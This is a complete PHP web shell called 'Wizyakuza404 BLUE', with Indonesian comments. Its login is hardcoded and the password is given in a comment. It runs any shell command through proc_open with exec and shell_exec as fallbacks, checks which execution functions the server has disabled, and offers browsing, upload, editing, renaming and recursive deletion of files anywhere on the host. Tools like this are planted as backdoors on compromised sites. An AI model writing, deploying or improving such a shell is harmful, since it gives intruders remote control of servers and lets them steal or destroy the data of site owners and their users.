<?php
/**
 * Wizyakuza404 - Blue Advanced Shell & File Manager - FIXED TERMINAL
 * Terminal now uses proc_open() like the working simple script
 */

if (!function_exists('is_fn_usable')) {
    function is_fn_usable($fn) {
        if (!function_exists($fn)) return false;
        $disabled = (string) @ini_get('disable_functions');
        $suhosin  = (string) @ini_get('suhosin.executor.func.blacklist');
        $blocked = array();
        if ($disabled !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $disabled)));
        if ($suhosin  !== '') $blocked = array_merge($blocked, array_map('trim', explode(',', $suhosin)));
        if (!empty($blocked)) {
            $blocked = array_filter(array_map('strtolower', $blocked));
            if (in_array(strtolower($fn), $blocked, true)) return false;
        }
        return true;
    }
}

date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : 'UTC');
session_start();

/* ---------- Auth ---------- */
define('AUTH_USER', 'admin');
define('AUTH_PASS_HASH', '$2a$12$BBaLHa.cGOJZR9697oj3auaNFtGk04W6vbsr8mqV9cwprwoPZM4SW'); // pass : n0t

/* ---------- Path Handling ---------- */
$initial_script_dir = realpath(getcwd());
$requested_path = isset($_GET['d']) ? (string)$_GET['d'] : '';
$base_current_path = realpath($requested_path);
if ($base_current_path === false || !is_dir($base_current_path)) {
    $current_path = $initial_script_dir;
} else {
    $current_path = $base_current_path;
}

/* ---------- Utility Functions ---------- */
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function biru_random_bytes($len){
    if (is_fn_usable('random_bytes')) return random_bytes($len);
    $out = ''; for ($i = 0; $i < $len; $i++) $out .= chr(mt_rand(0, 255));
    return $out;
}

function humanSize($b){
    $u = array('B','KB','MB','GB','TB'); $i = 0;
    while ($b >= 1024 && $i < count($u)-1){ $b/=1024; $i++; }
    return ($i ? number_format($b,2) : (string)$b) . ' ' . $u[$i];
}

function permsToString($f){
    $p = @fileperms($f); if ($p === false) return '??????????';
    $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $s  = (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-');
    $s .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-');
    $s .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-');
    return $t.$s;
}

function safeJoin($base,$child){
    $child = str_replace(array("\0", "..", "/", "\\"), '', $child);
    return rtrim($base, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$child;
}

function tryWriteFromTmp($tmp,$dest){
    if(@move_uploaded_file($tmp,$dest)) return true;
    if(@copy($tmp,$dest)) return true;
    return false;
}

function listDirEntries($dir){
    $h = @opendir($dir); if ($h===false) return array();
    $items=array(); while(false!==($e=readdir($h))){ $items[]=$e; }
    closedir($h); return $items;
}

function breadcrumbs($path){
    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
    $segments = array_values(array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen'));
    $out = array();
    $acc = (DIRECTORY_SEPARATOR === '\\') ? '' : DIRECTORY_SEPARATOR;
    if (DIRECTORY_SEPARATOR === '\\' && preg_match('~^[A-Za-z]:~', $path)) {
        $drive = substr($path, 0, 2); $acc = $drive . '\\'; $out[] = array($drive, $acc);
    } else { $out[] = array('root', DIRECTORY_SEPARATOR); }
    foreach($segments as $s){
        if (preg_match('~^[A-Za-z]:$~', $s)) continue;
        $acc = rtrim($acc, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $s;
        $out[] = array($s, $acc);
    }
    return $out;
}

function deleteRecursive($path) {
    if (!file_exists($path)) return true;
    if (!is_dir($path)) return unlink($path);
    
    $files = array_diff(scandir($path), array('.','..'));
    foreach ($files as $file) {
        $fullPath = $path . DIRECTORY_SEPARATOR . $file;
        if (is_dir($fullPath)) {
            deleteRecursive($fullPath);
        } else {
            @unlink($fullPath);
        }
    }
    return rmdir($path);
}

/* ============== TERMINAL FUNCTION - FIXED! ============== */
function executeCommand($cmd, $cwd) {
    // Pastikan direktori ada
    if (!is_dir($cwd)) {
        return [
            'output' => "ERROR: Directory not found: " . $cwd,
            'code' => 1
        ];
    }
    
    $output_text = '';
    $return_code = 0;
    
    // Method 1: Pakai proc_open (sama seperti script kedua yang berhasil)
    $descriptorspec = [
        0 => ["pipe", "r"],  // stdin
        1 => ["pipe", "w"],  // stdout
        2 => ["pipe", "w"]   // stderr
    ];
    
    $process = @proc_open($cmd, $descriptorspec, $pipes, $cwd);
    
    if (is_resource($process)) {
        // Baca stdout
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        
        $return_code = proc_close($process);
        $output_text = $stdout . $stderr;
        
        if (!empty($output_text)) {
            return [
                'output' => trim($output_text),
                'code' => $return_code
            ];
        }
    }
    
    // Method 2: Fallback ke exec() jika proc_open gagal
    if (function_exists('exec')) {
        $output = [];
        $full_cmd = $cmd . ' 2>&1';
        exec($full_cmd, $output, $return_code);
        $output_text = implode("\n", $output);
        
        if (!empty($output_text)) {
            return [
                'output' => trim($output_text),
                'code' => $return_code
            ];
        }
    }
    
    // Method 3: Fallback ke shell_exec()
    if (function_exists('shell_exec')) {
        $output_text = @shell_exec($cmd . ' 2>&1');
        if ($output_text !== null) {
            return [
                'output' => trim($output_text),
                'code' => 0
            ];
        }
    }
    
    return [
        'output' => "Cannot execute command. No method available (proc_open, exec, shell_exec all failed or disabled).",
        'code' => 1
    ];
}

/* ---------- Action Handling ---------- */
$msg = '';
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['user']) && $_POST['user'] == AUTH_USER && password_verify($_POST['pass'], AUTH_PASS_HASH)) {
        $_SESSION['auth'] = true; header("Location: ?"); exit;
    }
    echo '<body style="background:#0b1220;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center;font-family:sans-serif;"><form method="POST" style="background:#111827;padding:2rem;border-radius:12px;border:1px solid #374151;"><h3>Wizyakuza404 LOGIN</h3><input name="user" placeholder="User" style="display:block;margin-bottom:10px;padding:8px;width:200px;"><input name="pass" type="password" placeholder="Pass" style="display:block;margin-bottom:10px;padding:8px;width:200px;"><button type="submit" style="width:100%;padding:8px;background:#3b82f6;color:#fff;border:none;border-radius:4px;cursor:pointer;">Login</button></form></body>'; exit;
}

// Handle Logout
if (isset($_GET['a']) && $_GET['a'] === 'logout') {
    session_destroy();
    header("Location: ?");
    exit;
}

// Handle Delete
if (isset($_GET['a']) && $_GET['a'] === 'delete' && isset($_GET['file'])) {
    $delete_name = basename($_GET['file']);
    $delete_path = safeJoin($current_path, $delete_name);
    
    if (file_exists($delete_path)) {
        if (deleteRecursive($delete_path)) {
            $msg = "Berhasil menghapus: " . h($delete_name);
        } else {
            $msg = "Gagal menghapus: " . h($delete_name) . " (Permission denied)";
        }
    } else {
        $msg = "File/Folder tidak ditemukan!";
    }
    
    header("Location: ?tab=files&d=" . urlencode($current_path));
    exit;
}

// Handle Terminal Command
$terminal_output = '';
$last_command = '';
if (isset($_POST['terminal_cmd'])) {
    $last_command = $_POST['terminal_cmd'];
    $result = executeCommand($last_command, $current_path);
    $terminal_output = $result['output'];
    if ($result['code'] !== 0 && empty($terminal_output)) {
        $terminal_output = "Command executed with exit code: " . $result['code'];
    }
}

// Proses Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['a']) && $_GET['a'] === 'upload') {
    if (isset($_FILES['f_upload']) && $_FILES['f_upload']['error'] === UPLOAD_ERR_OK) {
        $target = safeJoin($current_path, $_FILES['f_upload']['name']);
        if (tryWriteFromTmp($_FILES['f_upload']['tmp_name'], $target)) {
            $msg = "Upload sukses: " . h($_FILES['f_upload']['name']);
        } else { $msg = "Upload gagal!"; }
    }
}

// Handle Rename
if (isset($_GET['a']) && $_GET['a'] === 'rename' && isset($_GET['file'])) {
    $old_name = basename($_GET['file']);
    $old_path = safeJoin($current_path, $old_name);
    
    if (isset($_POST['new_name']) && !empty($_POST['new_name'])) {
        $new_name = basename($_POST['new_name']);
        $new_path = safeJoin(dirname($old_path), $new_name);
        
        if (file_exists($old_path)) {
            if (@rename($old_path, $new_path)) {
                $msg = "Berhasil rename: " . h($old_name) . " → " . h($new_name);
                header("Location: ?tab=files&d=" . urlencode($current_path));
                exit;
            } else {
                $msg = "Gagal rename file/folder!";
            }
        } else {
            $msg = "File/Folder tidak ditemukan!";
        }
    }
    
    $rename_target = $old_name;
    $is_rename_mode = true;
}

// Handle Edit File
if (isset($_GET['a']) && $_GET['a'] === 'edit' && isset($_GET['file'])) {
    $edit_filename = basename($_GET['file']);
    $edit_filepath = safeJoin($current_path, $edit_filename);
    
    if (is_dir($edit_filepath)) {
        $msg = "Tidak bisa edit folder!";
    } elseif (file_exists($edit_filepath)) {
        if (isset($_POST['file_content'])) {
            if (@file_put_contents($edit_filepath, $_POST['file_content']) !== false) {
                $msg = "Berhasil menyimpan file: " . h($edit_filename);
                header("Location: ?tab=files&d=" . urlencode($current_path));
                exit;
            } else {
                $msg = "Gagal menyimpan file! (Permission denied)";
            }
        }
        
        $file_content = @file_get_contents($edit_filepath);
        if ($file_content === false) {
            $msg = "Gagal membaca file!";
        } else {
            $is_edit_mode = true;
            $edit_file = $edit_filename;
            $edit_content = $file_content;
        }
    } else {
        $msg = "File tidak ditemukan!";
    }
}

$active_tab = isset($_GET['tab']) ? $_GET['tab'] : 'files';
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Wizyakuza404 Simple - Fixed Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background:#0b1220; color:#e5e7eb; font-family:'Ubuntu', sans-serif; }
        .terminal-bg { background: #0a0e17; }
        .terminal-text { color: #10b981; font-family: 'Courier New', monospace; }
        .terminal-input:focus { outline: none; }
        .sidebar-item:hover { background: rgba(59,130,246,0.1); }
    </style>
</head>
<body>
    <!-- SIDEBAR -->
    <div style="position: fixed; left: 0; top: 0; width: 260px; height: 100vh; background: #111827; border-right: 1px solid #374151; overflow-y: auto; z-index: 50;">
        <div style="padding: 24px;">
            <h1 style="font-size: 24px; font-weight: bold; color: #3b82f6; margin-bottom: 32px;">🔵 Wizyakuza404 BLUE</h1>
            
            <nav style="display: flex; flex-direction: column; gap: 8px;">
                <a href="?tab=files&d=<?= urlencode($initial_script_dir) ?>" style="display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 8px; background: <?= $active_tab == 'files' ? '#1e293b' : 'transparent' ?>; color: <?= $active_tab == 'files' ? '#3b82f6' : '#9ca3af' ?>; text-decoration: none; transition: all 0.2s;">
                    <span style="font-size: 20px;">📁</span>
                    <span>File Manager</span>
                </a>
                
                <a href="?tab=terminal&d=<?= urlencode($current_path) ?>" style="display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 8px; background: <?= $active_tab == 'terminal' ? '#1e293b' : 'transparent' ?>; color: <?= $active_tab == 'terminal' ? '#3b82f6' : '#9ca3af' ?>; text-decoration: none; transition: all 0.2s;">
                    <span style="font-size: 20px;">🖥️</span>
                    <span>Terminal</span>
                </a>
                
                <div style="height: 1px; background: #374151; margin: 16px 0;"></div>
                
                <a href="?a=logout" style="display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 8px; color: #ef4444; text-decoration: none;">
                    <span>🚪</span>
                    <span>Logout</span>
                </a>
            </nav>
        </div>
    </div>

    <!-- MAIN CONTENT -->
    <div style="margin-left: 260px; padding: 32px; min-height: 100vh;">
        <?php if($msg): ?>
            <div style="background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.3); padding: 12px; margin-bottom: 20px; border-radius: 8px;">
                ℹ️ <?= $msg ?>
            </div>
        <?php endif; ?>

        <!-- TERMINAL MODE -->
        <?php if ($active_tab === 'terminal'): ?>
        <div style="background: #0a0e17; border: 1px solid #374151; border-radius: 12px; overflow: hidden;">
            <div style="background: #1f2937; padding: 16px 20px; border-bottom: 1px solid #374151; display: flex; justify-content: space-between; align-items: center;">
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="color: #10b981; font-weight: bold;">🖥️ $></span>
                    <span style="color: #9ca3af; font-size: 14px;">Terminal - Current Dir: <?= h($current_path) ?></span>
                </div>
                <form method="GET" style="margin: 0;">
                    <input type="hidden" name="tab" value="terminal">
                    <input type="hidden" name="d" value="<?= urlencode($current_path) ?>">
                    <button type="submit" name="clear" value="1" style="background: #374151; border: none; padding: 4px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 12px;">Clear</button>
                </form>
            </div>
            
            <div style="padding: 20px;">
                <div style="background: #000000; border-radius: 8px; padding: 16px; margin-bottom: 20px; font-family: 'Courier New', monospace; font-size: 13px; min-height: 400px; max-height: 500px; overflow-y: auto; color: #d1d5db;">
                    <?php
                    if (isset($_GET['clear'])) {
                        $terminal_output = '';
                        $last_command = '';
                    }
                    
                    if (!empty($terminal_output)) {
                        echo '<div style="color: #10b981; margin-bottom: 8px;">$ ' . h($last_command) . '</div>';
                        echo '<pre style="color: #d1d5db; white-space: pre-wrap; margin-bottom: 16px;">' . h($terminal_output) . '</pre>';
                        echo '<div style="color: #4b5563; border-top: 1px solid #374151; padding-top: 8px; margin-top: 8px;">---</div>';
                    }
                    ?>
                    
                    <?php if (empty($terminal_output) && empty($last_command)): ?>
                    <div style="color: #6b7280;">
                        <div style="color: #10b981; margin-bottom: 8px;">Welcome to Wizyakuza404 Terminal (FIXED VERSION)</div>
                        <div>Available commands: ls, dir, cd, pwd, mkdir, rm, cp, mv, cat, grep, find, chmod, ps, df, du, whoami, uname, php, python, etc</div>
                        <div style="color: #4b5563; margin-top: 8px;">Type 'help' for more information</div>
                        <div style="color: #10b981; margin-top: 8px;">✓ Terminal now uses proc_open() - same as working script!</div>
                    </div>
                    <?php endif; ?>
                </div>
                
                <form method="POST" style="margin-top: 16px;">
                    <input type="hidden" name="tab" value="terminal">
                    <div style="display: flex; align-items: center; gap: 8px; background: #111827; border: 1px solid #374151; border-radius: 8px; padding: 12px;">
                        <span style="color: #10b981; font-family: monospace; font-weight: bold;">$></span>
                        <input type="text" 
                               name="terminal_cmd" 
                               id="terminal_cmd"
                               value="<?= h($last_command) ?>"
                               style="flex: 1; background: transparent; border: none; color: #d1d5db; font-family: 'Courier New', monospace; font-size: 14px; outline: none;" 
                               placeholder="Type your command here... (ex: ls -la, pwd, whoami)"
                               autocomplete="off"
                               autofocus>
                        <button type="submit" style="background: #2563eb; border: none; padding: 6px 16px; border-radius: 6px; color: white; cursor: pointer; font-size: 13px;">Run</button>
                    </div>
                </form>
                
                <div style="margin-top: 16px; text-align: center; font-size: 11px; color: #4b5563;">
                    💡 Tip: Use 'ls -la' for detailed list, 'pwd' for current directory, 'cat filename.html' to view file content
                </div>
            </div>
        </div>
        
        <script>
            document.getElementById('terminal_cmd')?.focus();
        </script>

        <!-- EDIT MODE -->
        <?php elseif (isset($is_edit_mode) && $is_edit_mode): ?>
        <div style="background: rgba(31,41,55,0.4); padding: 20px; border-radius: 12px; border: 1px solid #374151;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="font-size: 20px; font-weight: bold; color: #3b82f6;">✏️ Edit File: <?= h($edit_file) ?></h2>
                <a href="?tab=files&d=<?= urlencode($current_path) ?>" style="background: #4b5563; padding: 8px 16px; border-radius: 8px; text-decoration: none; color: white; font-size: 14px;">← Back</a>
            </div>
            <form method="POST">
                <textarea name="file_content" rows="20" style="width: 100%; background: #111827; border: 1px solid #374151; border-radius: 8px; padding: 16px; font-family: monospace; font-size: 13px; color: #d1d5db; outline: none;"><?= h($edit_content) ?></textarea>
                <div style="margin-top: 16px; display: flex; gap: 12px;">
                    <button type="submit" style="background: #2563eb; padding: 8px 24px; border: none; border-radius: 8px; color: white; cursor: pointer;">💾 Save</button>
                    <a href="?tab=files&d=<?= urlencode($current_path) ?>" style="background: #4b5563; padding: 8px 24px; border-radius: 8px; text-decoration: none; color: white;">Cancel</a>
                </div>
            </form>
        </div>
        
        <!-- RENAME MODE -->
        <?php elseif (isset($is_rename_mode) && $is_rename_mode): ?>
        <div style="background: rgba(31,41,55,0.4); padding: 20px; border-radius: 12px; border: 1px solid #374151;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 style="font-size: 20px; font-weight: bold; color: #3b82f6;">✏️ Rename: <?= h($rename_target) ?></h2>
                <a href="?tab=files&d=<?= urlencode($current_path) ?>" style="background: #4b5563; padding: 8px 16px; border-radius: 8px; text-decoration: none; color: white; font-size: 14px;">Cancel</a>
            </div>
            <form method="POST">
                <label style="display: block; font-size: 14px; color: #9ca3af; margin-bottom: 8px;">New name:</label>
                <input type="text" name="new_name" value="<?= h($rename_target) ?>" style="width: 100%; background: #111827; border: 1px solid #374151; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 14px; color: #d1d5db; outline: none; margin-bottom: 16px;" required>
                <button type="submit" style="background: #2563eb; padding: 8px 24px; border: none; border-radius: 8px; color: white; cursor: pointer;">🔄 Rename</button>
            </form>
        </div>
        
        <!-- FILE MANAGER MODE -->
        <?php else: ?>
        
        <!-- Breadcrumbs -->
        <div style="display: flex; align-items: center; gap: 8px; font-size: 14px; color: #9ca3af; margin-bottom: 24px;">
            <span>📂</span>
            <?php foreach(breadcrumbs($current_path) as $bc): ?>
                <a href="?tab=files&d=<?= urlencode($bc[1]) ?>" style="color: #3b82f6; text-decoration: none;"><?= h($bc[0]) ?></a>
                <span>/</span>
            <?php endforeach; ?>
        </div>

        <!-- Upload Form -->
        <div style="background: rgba(31,41,55,0.4); padding: 16px; border-radius: 12px; border: 1px solid #374151; margin-bottom: 24px;">
            <form action="?tab=files&d=<?= urlencode($current_path) ?>&a=upload" method="POST" enctype="multipart/form-data" style="display: flex; align-items: center; gap: 16px;">
                <input type="file" name="f_upload" style="font-size: 14px; color: #9ca3af;">
                <button type="submit" style="background: #2563eb; padding: 8px 20px; border: none; border-radius: 8px; color: white; cursor: pointer;">📤 Upload</button>
            </form>
        </div>

        <!-- File List Table -->
        <div style="background: rgba(31,41,55,0.2); border: 1px solid #374151; border-radius: 12px; overflow-x: auto;">
            <table style="width: 100%; text-align: left; font-size: 14px;">
                <thead style="background: rgba(31,41,55,0.5); color: #9ca3af;">
                    <tr>
                        <th style="padding: 16px;">Name</th>
                        <th style="padding: 16px;">Size</th>
                        <th style="padding: 16px;">Perms</th>
                        <th style="padding: 16px;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if($current_path != DIRECTORY_SEPARATOR && $current_path != $initial_script_dir): ?>
                    <tr style="border-bottom: 1px solid #374151;">
                        <td style="padding: 16px;">
                            <a href="?tab=files&d=<?= urlencode(dirname($current_path)) ?>" style="display: flex; align-items: center; gap: 8px; color: #f59e0b; font-weight: bold; text-decoration: none;">
                                ⬆️ .. (Back)
                            </a>
                        </td>
                        <td colspan="3"></td>
                    </tr>
                    <?php endif; ?>

                    <?php
                    $files = listDirEntries($current_path);
                    natcasesort($files);
                    foreach($files as $f):
                        if($f == '.' || $f == '..') continue;
                        $full = safeJoin($current_path, $f);
                        $is_dir = is_dir($full);
                    ?>
                    <tr style="border-bottom: 1px solid #374151;">
                        <td style="padding: 16px;">
                            <?php if($is_dir): ?>
                                <a href="?tab=files&d=<?= urlencode($full) ?>" style="display: flex; align-items: center; gap: 8px; color: #fbbf24; text-decoration: none;">
                                    📁 <?= h($f) ?>
                                </a>
                            <?php else: ?>
                                <div style="display: flex; align-items: center; gap: 8px; color: #d1d5db;">
                                    📄 <?= h($f) ?>
                                </div>
                            <?php endif; ?>
                        </td>
                        <td style="padding: 16px; color: #6b7280;"><?= $is_dir ? 'DIR' : humanSize(@filesize($full)) ?></td>
                        <td style="padding: 16px; font-family: monospace; font-size: 11px; color: #6b7280;"><?= permsToString($full) ?></td>
                        <td style="padding: 16px;">
                            <div style="display: flex; gap: 12px;">
                                <?php if(!$is_dir): ?>
                                <a href="?tab=files&d=<?= urlencode($current_path) ?>&a=edit&file=<?= urlencode($f) ?>" style="color: #3b82f6; text-decoration: none; font-size: 12px;">✏️ Edit</a>
                                <?php endif; ?>
                                <a href="?tab=files&d=<?= urlencode($current_path) ?>&a=rename&file=<?= urlencode($f) ?>" style="color: #10b981; text-decoration: none; font-size: 12px;">🔄 Rename</a>
                                <a href="?tab=files&d=<?= urlencode($current_path) ?>&a=delete&file=<?= urlencode($f) ?>" 
                                   style="color: #ef4444; text-decoration: none; font-size: 12px;" 
                                   onclick="return confirm('Yakin ingin menghapus <?= $is_dir ? 'folder' : 'file' ?>: <?= addslashes($f) ?>?')">🗑️ Delete</a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>